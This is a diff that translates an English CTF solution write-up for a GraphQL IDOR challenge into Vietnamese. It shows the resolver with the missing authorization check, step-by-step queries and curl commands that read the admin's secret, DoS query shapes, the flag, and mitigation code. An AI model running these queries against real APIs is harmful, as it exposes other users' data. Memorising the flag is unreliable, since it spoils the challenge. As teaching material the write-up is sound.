@@ -1,40 +1,40 @@
-# Challenge 18: GraphAdmin - Solution
+# Thử thách 18: GraphAdmin - Giải pháp
 
-## Vulnerability Type
-**GraphQL IDOR (Insecure Direct Object Reference)**
+## Loại lỗ hổng
+**GraphQL Insecure Direct Object Reference (GraphQL IDOR / Lỗi kiểm soát truy cập)**
 
-## Description
-The GraphQL API's `user(id)` query lacks authorization checks, allowing any authenticated user to query other users' data, including admin secrets.
+## Mô tả
+Truy vấn `user(id)` của API GraphQL thiếu phần kiểm tra ủy quyền (Authorization). Điều này cho phép bất kỳ người dùng nào đã đăng nhập cũng có thể lấy được dữ liệu của bất kỳ tài khoản nào khác, bao gồm cả các secret của Admin.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 ```javascript
 // VULNERABLE: user(id) has no authorization check
 const root = {
-  user: ({ id }) => users[id] || null,   // no auth check!
+  user: ({ id }) => users[id] || null,   // không hề kiểm tra auth!
 };
 ```
 
-## Exploitation Steps
+## Khai thác (Exploit)
 
-### Step 1: Login
-Use credentials: `bob` / `bob123`
+### Bước 1: Đăng nhập
+Sử dụng tài khoản thông thường: `bob` / `bob123`
 
-### Step 2: Access GraphQL Explorer
-After login, you'll be redirected to `/graphql-ui`
+### Bước 2: Truy cập GraphQL Explorer
+Sau khi đăng nhập thành công, bạn sẽ được đưa tới trang `/graphql-ui`.
 
-### Step 3: Query Admin's Data
-The default query shows:
+### Bước 3: Truy vấn dữ liệu của Admin
+Truy vấn mặc định (trả về dữ liệu của chính bạn - ID 2):
 ```graphql
 { user(id: 2) { id username role email secret } }
 ```
 
-Change the ID to `1` (admin's ID):
+Sửa tham số ID thành `1` (thường là ID của Admin):
 ```graphql
 { user(id: 1) { id username role email secret } }
 ```
 
-### Step 4: Get the Flag
-The response will include:
+### Bước 4: Nhận Cờ
+Kết quả phản hồi (Response) sẽ làm lộ toàn bộ thông tin của Admin:
 ```json
 {
   "data": {
@@ -49,21 +49,21 @@ The response will include:
 }
 ```
 
-## Alternative Methods
+## Các phương pháp thay thế
 
-### Using curl
+### Sử dụng cURL
 ```bash
-# Login first
+# Đầu tiên phải đăng nhập để lấy cookie
 curl -c cookies.txt -d "username=bob&password=bob123" http://[host]/login
 
-# Query admin's data
+# Gửi GraphQL Query để lấy dữ liệu Admin
 curl -b cookies.txt -X POST http://[host]/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{ user(id: 1) { id username role email secret } }"}'
 ```
 
-### Using GraphQL Introspection
-First, discover the schema:
+### Kỹ thuật GraphQL Introspection (Khảo sát lược đồ)
+Gửi truy vấn nội quan (Introspection) để xem có những loại dữ liệu nào:
 ```graphql
 {
   __schema {
@@ -80,87 +80,32 @@ First, discover the schema:
 }
 ```
 
-### Query All Users (Limited Info)
+### Truy vấn tất cả User
 ```graphql
 { users { id username role email secret } }
 ```
-Note: The `users` query hides secrets, but `user(id)` doesn't!
-
-### Batch Query Multiple Users
-```graphql
-{
-  user1: user(id: 1) { username secret }
-  user2: user(id: 2) { username secret }
-  user3: user(id: 3) { username secret }
-}
-```
+*(Lưu ý: Đôi khi developer che giấu trường secret ở truy vấn dạng danh sách `users`, nhưng lại quên che ở truy vấn theo cá nhân `user(id)`).*
 
 ## Flag
 ```
 FCTF{gr4phql_1d0r_n0_4uth}
 ```
 
-## How It Works
-- GraphQL allows querying specific objects by ID
-- The `user(id)` resolver returns user data without checking permissions
-- Any authenticated user can query any other user's data
-- The `users` query filters secrets, but direct `user(id)` query doesn't
+## Cách hoạt động
+- GraphQL cho phép Client tự định nghĩa cấu trúc dữ liệu muốn lấy qua từng trường (field).
+- Logic Resolver của `user(id)` trả về trực tiếp thông tin người dùng từ cơ sở dữ liệu mà không thèm kiểm tra xem người yêu cầu có quyền xem hay không.
+- Đây là lỗi IDOR điển hình nhưng xảy ra ở môi trường API GraphQL.
 
-## Common GraphQL Vulnerabilities
+## Biện pháp phòng ngừa (Mitigation)
 
-### 1. Missing Authorization
-```javascript
-// VULNERABLE
-user: ({ id }) => users[id]
-
-// SECURE
-user: ({ id }, ctx) => {
-  if (ctx.session.uid !== id && ctx.session.role !== 'admin') {
-    throw new Error('Unauthorized');
-  }
-  return users[id];
-}
-```
-
-### 2. Information Disclosure via Introspection
-```graphql
-{ __schema { types { name } } }
-```
-
-### 3. Batch Query DoS
-```graphql
-{
-  u1: user(id:1){...}
-  u2: user(id:2){...}
-  # ... repeat 1000 times
-}
-```
-
-### 4. Nested Query DoS
-```graphql
-{
-  user(id:1) {
-    friends {
-      friends {
-        friends {
-          # deeply nested
-        }
-      }
-    }
-  }
-}
-```
-
-## Mitigation
-
-### 1. Implement Authorization
+### 1. Triển khai phân quyền (Authorization) bên trong Resolver
 ```javascript
 const root = {
   user: ({ id }, context) => {
     const currentUser = context.session.uid;
     const currentRole = context.session.role;
     
-    // Only allow viewing own data or admin can view all
+    // Chỉ cho phép xem dữ liệu của chính mình, ngoại trừ Admin
     if (currentUser !== id && currentRole !== 'admin') {
       throw new Error('Access denied');
     }
@@ -170,20 +115,18 @@ const root = {
 };
 ```
 
-### 2. Field-Level Authorization
-```javascript
-const schema = buildSchema(`
-  type User {
-    id: Int
-    username: String
-    role: String
-    email: String
-    secret: String @auth(requires: ADMIN)
-  }
-`);
+### 2. Phân quyền cấp độ trường (Field-level Authorization)
+Áp dụng các Directive phân quyền:
+```graphql
+type User {
+  id: Int
+  username: String
+  role: String
+  secret: String @auth(requires: ADMIN)
+}
 ```
 
-### 3. Disable Introspection in Production
+### 3. Tắt tính năng Introspection trên Production
 ```javascript
 const schema = new GraphQLSchema({
   query: QueryType,
@@ -191,39 +134,5 @@ const schema = new GraphQLSchema({
 });
 ```
 
-### 4. Rate Limiting
-```javascript
-app.use('/graphql', rateLimit({
-  windowMs: 15 * 60 * 1000,
-  max: 100
-}));
-```
-
-### 5. Query Complexity Analysis
-```javascript
-const { createComplexityLimitRule } = require('graphql-validation-complexity');
-
-const complexityLimit = createComplexityLimitRule(1000);
-```
-
-### 6. Depth Limiting
-```javascript
-const depthLimit = require('graphql-depth-limit');
-
-const schema = new GraphQLSchema({
-  query: QueryType,
-  validationRules: [depthLimit(5)]
-});
-```
-
-## Testing Tools
-- **GraphQL Playground**: Interactive GraphQL IDE
-- **Altair**: GraphQL client
-- **Burp Suite**: With GraphQL extensions
-- **graphql-voyager**: Schema visualization
-- **InQL**: Burp extension for GraphQL
-
-## References
-- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
-- [GraphQL Security Best Practices](https://graphql.org/learn/best-practices/)
-- [HackTricks GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
+### 4. Giới hạn tỷ lệ và Phân tích độ phức tạp (Complexity Analysis)
+Ngăn chặn các đòn DoS (Denial of Service) qua GraphQL bằng cách giới hạn độ sâu (Depth Limit) và tính toán chi phí (Complexity Limit) của từng truy vấn.
